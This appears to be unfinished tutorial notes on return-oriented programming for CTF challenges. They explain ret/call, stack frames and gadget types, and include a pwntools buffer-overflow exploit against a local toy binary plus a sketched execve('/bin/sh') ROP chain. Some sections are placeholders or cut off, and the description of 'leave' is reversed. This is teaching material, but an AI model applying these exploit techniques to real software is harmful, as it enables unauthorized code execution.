Return Oriented Programming

return oriented programming is the process of stringing together existing code within the binary
to execute your shellcode, this is important as ALL modern binaries will have NX/DEP enabled. This is
a stack protection which essentially sets the stack as non executable, so any shellcode pushed on
will not be able to execute. This is an exploit mitigation for out stack buffer overflows, another
simpler bypass of NX is return to libc, which does essentially the same thing but strings together
existing code within the libc and binary to execute instructions and or shellcode. A major downside to
the technique known as ret2libc is that it only targets linux machines, as ive never heard of ret2dll.
this will only work on linux binaries, which is fun and good to know for CTF challenges, but unless
we plan on exploiting linux, we should stay in the general area of ROP which is applicable in basically
all scenarios and enviroments. Since ret2libc is indeed interesting i will first explain that before
getting into ROP.


### TALK ABOUT RET2LIBC, DEMO TOO

Now that we have ret2libc out of the way, lets establish the baseline understanding of return oriented programming

an important thing to keep in mind is that pretty much all rop gadgets will end with a RET instruction
before i explain why this is the case, and sometimes not the case, i will first explain what RET does:

RET Transfers program control to a return address located on the top of the stack.
The address is usually placed on the stack by a CALL instruction, and the return is made to the
instruction that follows the CALL instruction.
```x86asm
ret
; is basically
; pop eip
```
no known assembler will interpret and assemble this since it is invalid in more ways than one
It's pseudocode for explaining what ret does.

Now that we understand that RET doesnt just mean, stop function, we can now begin to explain CALL
this is important due to the fact that call and ret work in tandem with each other:
```
call randomfunc

; push 0xdeadbeef
; jmp printf
```
in this case, 0xdeadbeef is the address in which our program will continue execution
in many cases this would be after printf call within main()

since call pushes the return address onto the stack then jmp's to called function
then "pop eip" makes sense, as we are continuing execution at the provided address on the stack

### Why is this relevant?
Why does any of this matter in the case of return oriented programming??

Because all of our ROP gadgets are required to have a ret after each of them.
Why?? Why do rop gadgets need a ret after them?
we've explained how call works, and we've explained how ret works, it pops the value on the top
of the stack into EIP/RIP, our special instruction register that points to the next instruction.

Now lets just say we have this example c code:

```x86asm
disassembled foo() and bar() func:

┌ 45: sym.foo ();
│           0x00401180      55             push rbp
│           0x00401181      4889e5         mov rbp, rsp
│           0x00401184      488d3d7d0e00.  lea rdi, str.Opening_real_flag_ ; 0x402008 ; "Opening real flag!" ; const char *format
│           0x0040118b      b800000000     mov eax, 0
│           0x00401190      e89bfeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401195      be00000000     mov esi, 0                  ; int oflag
│           0x0040119a      488d3d7a0e00.  lea rdi, str.flag.txt       ; 0x40201b ; "flag.txt" ; const char *path
│           0x004011a1      b800000000     mov eax, 0
│           0x004011a6      e8b5feffff     call sym.imp.open           ; int open(const char *path, int oflag)
│           0x004011ab      5d             pop rbp
└           0x004011ac      c3             ret


┌ 83: sym.bar ();
│           ; var int64_t var_4h @ rbp-0x4
│           0x004011ad      55             push rbp
│           0x004011ae      4889e5         mov rbp, rsp
│           0x004011b1      4883ec10       sub rsp, 0x10
│           0x004011b5      be00000000     mov esi, 0                  ; int oflag
│           0x004011ba      488d3d630e00.  lea rdi, str.wrong.txt      ; "wrong.txt"
│           0x004011c1      b800000000     mov eax, 0
│           0x004011c6      e895feffff     call sym.imp.open           ; int open()
│           0x004011cb      8945fc         mov dword [var_4h], eax
│           0x004011ce      488d3d5b0e00.  lea rdi, str.Oh_im_sorry__did_you_want_the_flag__
│           0x004011d5      b800000000     mov eax, 0
│           0x004011da      e851feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004011df      8b45fc         mov eax, dword [var_4h]
│           0x004011e2      b9d0070000     mov ecx, 0x7d0              ; 2000
│           0x004011e7      ba00000000     mov edx, 0
│           0x004011ec      89c6           mov esi, eax
│           0x004011ee      bf01000000     mov edi, 1
│           0x004011f3      b800000000     mov eax, 0
│           0x004011f8      e853feffff     call sym.imp.sendfile
│           0x004011fd      90             nop
│           0x004011fe      c9             leave
└           0x004011ff      c3             ret
```

the first thing we will do is overwrite our 16 byte buffer, the offset for this binary is 24 until
we overwrite the return address placed on the stack.

now once we find the offset, we can control eip/rip by sending whatever address we want into it
IT DOES NOT NEED TO BE A FUNCTION
ret is essentially POP EIP remember?, like we said before if eip pops that value off the stack and
resumes execution at the location we provided, then we can hijack control. Except this time there is
a twist, NX is enabled, so we need to get creative.

1. foo() will open the correct flag.txt, but will not output it for us
2. bar() will output our flag, but it reads the incorrect one

the leave instruction seen in bar() will essentially moves ebp into esp, which "deallocates"
that area that has been allocated before. This is the purpose of establishing a stack frame
Here is an example of a stack frame:
```
push ebp
mov ebp, esp
sub esp, 16  ; whatever size of local variable you are planning on using

; code

pop ebp
ret
```
Here is a visual representation of how the stack frame is established and or deallocated

ALLOCATIION
1. push ebp     ; push on to stack
```
+-----------+
|    ebp    |
+-----------+
```

2. mov ebp, esp
ebp and esp both point to the same address
```
+-----------+
|  ebp/esp  |
+-----------+
```
3. sub esp, 0x8
```
+-----------+
|    ebp    |
+-----------+
|           | < - space to store local variables on the stack
+-----------+
|    esp    |
+-----------+
```
4. mov dword [ebp-4], 0xcafebabe
```
+-----------+
|    ebp    |
+-----------+
| 0xcafebabe| < - space to store local variables on the stack
+-----------+
|    esp    |
+-----------+
```

### DEALLOCATION
in these cases, deallocation of stack variables can come in the form of:
mov esp, ebp
or:
leave

This is the stack before deallocation
+-----------+
|    ebp    |
+-----------+
| 0xcafebabe|
+-----------+
|    esp    |
+-----------+


This is the stack after deallocation
+-----------+
|  ebp/esp  |
+-----------+

Now that we hopefully have a slightly better understanding of the purpose of the stack frame
we now understand what the leave instruction does, and how it deallocates memory on the stack







in this case, the function will open the file, and return to main. This means it will not print
anything to screen, which means we do not get our precious flag. If we want to get the flag, we
can find where the open function is being setup, write that address over the return address, open
and get fd for correct flag.txt, then when pop's back to rbp,













#!/usr/bin/env python2
from pwn import *

offset = 24

p = process('a.out')
# saved return address to return from foo's open call
# mov esi, 0x0      ; int oflag
addr1 = p64(0x00401195)

# this is where foo will return to
# the reason we called open first should be obvious, we need to open the correct file
# then pass execution and or overwrite x variable with address of our opened fd so sendfile will
# print it
addr2 = p64(0x004011e2)
# this is the setup for syscall sendfile, so we want to return to here
# 0xdeadbeef==junk??, no reason to shove CCCC's there
# yes, the reason we need a junk address is due to the fact that the next register we write will
# be ebp/rbp, this is not important for us, as without the junk address, ebp would equal our address
# of addr2 that we want to execute, and eip/rip would be overwritten with junk, causing a seg fault
payload = "A"*offset + addr1 + p64(0xdeadbeef) + addr2
p.send(payload)
print p.recvall()





--------------------------------


note:
pop rop gadgets are stack fix-up gadgets
add is also a stack fix gadget, for possibly jumping over corrupted memory

pop rdi ; ret   ; is an example

; this may be used as a skip over garbage gadget
sub rsp, 0x40
# stuff goes here
add rsp, 0x40


# ROP, rare and common gadgets

ret                 - at the end of every function, can be used as a ret(nop) sled
leave ; ret         - pop ebp ; mov esp, ebp | dont corrupt ebp/rbp or you will break esp/rsp too
pop rdi ; ret       - this does not have to be rdi | restoring callee saved registers before returning
mov rax, *** ; ret  - saves the return value before returning to return address(many returns)


ROP, storing addresses into registers(very situational!)

push rsp ; pop rax ; ret    ; will mov stack address/pointer into rax
add rax, rsp ; ret          ; not perfect but conceptually will move rsp into rax
xchg rax, rsp ; ret         ; swap rax and rsp(DANGEROUS)


# ROP stack pivoting:
there are many reasons not to like your particular stack, some of them includes limiting the amount
of bytes you can overwrite so you may not be able to create a long ROP chain. Here we have a solution
to that, stack pivoting.

xchg == exchange, this swaps rax and rsp
when the next ret is executed, the return address previouly pushed on the stack will be popped off on
to your new stack, which is where rax use to point. You obviously need to mov the address into rax
beforehand.
xchg, rax, rsp ; ret

pop rsp ; ... ; ret

# ROP, transfering data:
we had previously explained how to mov addresses into registers and passing parameters on the stack
with rop gadgets, now we will talk about passing data and values with rop gadgets

example of common gadget:
add byte [rcx], al ; pop rbp ; ret

this would require a gadget to be able to set rcx(rare) and rax(more common).

ROP, syscalls are rare
extrememly rare, you will most likely never find a syscall within a binary
the shortest path to our flag will be calling a libc function like printf@plt through the PLT
procedure linkage table, and or calling system@plt for code execution

ROP, KNOW YOUR ENVIROMENT
the ropchain is located on a place on a stack, KNOW THAT ENVIROMENT WELL, there are tons of info and
things to use to get code execution. Think about the code, the stack, the heap in registers and or
on the stack.

use the registers that point to all of them, you might be able to use those registers :)


[EXPLAIN AN EXAMPLE ROP CHAIN EXPLOIT BE WRITING AND EXECVE ON STACK]
This is essentially the values our stack will contain, now we just need the gadgets to pop them off
in order then syscall to hopefully give us the shell
+-----------+
|   0x3b    |
+-----------+
| /bin/sh\0 |
+-----------+
|    0x0    |
+-----------+
|    0x0    |
+-----------+
|           |
+-----------+

OUR GADGET SHOULD BE THIS FOR THE x86_64 CALLING CONVENTION
pop rdx, 0x0068732f6e69622f
pop rax, 0x6b6000
mov qword ptr [rax], rdx ; ret

pop rax, 0x3b       ; 0x3b is 11, execve syscall for x64
pop rdi, 0x6b6000   ; address of /bin/sh string we wrote to
pop rsi, 0x0
pop rdx, 0x0

syscall

